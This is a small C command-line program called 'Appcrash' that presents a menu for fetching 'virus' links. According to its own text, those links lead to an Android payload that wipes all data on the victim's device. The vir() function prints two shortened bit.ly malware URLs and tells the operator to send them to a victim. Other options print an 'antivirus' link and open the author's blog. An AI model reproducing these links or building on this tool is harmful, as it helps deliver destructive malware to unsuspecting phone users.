//#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


// variables

char command[50];


void option(){

  printf("\n\n1. Get an virus link from server \n2. Get an Antivirus Link \n3. About Author\n4. Exit");
  printf("\n\nOption :");

}


void banner(){

  strcpy(command, "cat file/ban");
  system(command);
  sleep(1.5);
}


void info(){
	
  printf("\nAppcrash is a tool used to send malicious link to the victim\n");
  printf("This will completly wipe all the datas on android platforms so am not responsible if any loss occures !\n");
  printf("This Tool contains 2 APk's that are Explaied well in the Git Repo !\n");
  printf("Created by 7R1X\n");
  sleep(1);
}


void vir(){
  printf("Link is being processed Please wait\n\n");
  sleep(1.25);
  printf("VIRUS  URL LINK 1 : https://bit.ly/3XIosHY\n\n");
  sleep(1);
  printf("VIRUS URL LINK 2 : https://bit.ly/3YjN8GL\n\n");
  printf("Send This link to your victim !\n");
   //Change it to dd format !
}


void author(){

   printf("\nSMUKX -> 7R1X\n");
   sleep(1);
   printf("Visit my blog to Know more about me\n");
   printf("Blog -> https://smukx.github.io\n\n");
   printf("Redirecting to my blog...\n");
   printf("3..");
   sleep(1);
   printf("2..");
   sleep(1);
   printf("1");

  

   strcpy(command,"firefox https://smukx.github.io");
   system(command);
}


void ant()
  {
    printf("Fetching  Link , Please Wait !\n");
    sleep(1);
    printf("LINK : https://bit.ly/3WJKGrw\n");
    //paste the original link hehe
  }

void clear(){
  // paste path that file here !
   char command[50];

   strcpy( command, "clear" );
   system(command);
}

int main(){
  


  int x;
  clear();
  sleep(0.5);
  banner();
  info();
  option();
  
  scanf("%d",&x);
  if(x==1)
    vir();
  else if(x==2)
    ant();
  else if (x==3)
    author();
  else if (x==4)
    printf("HEHE BYEEE...7R1X");
    exit(-1);


  

}
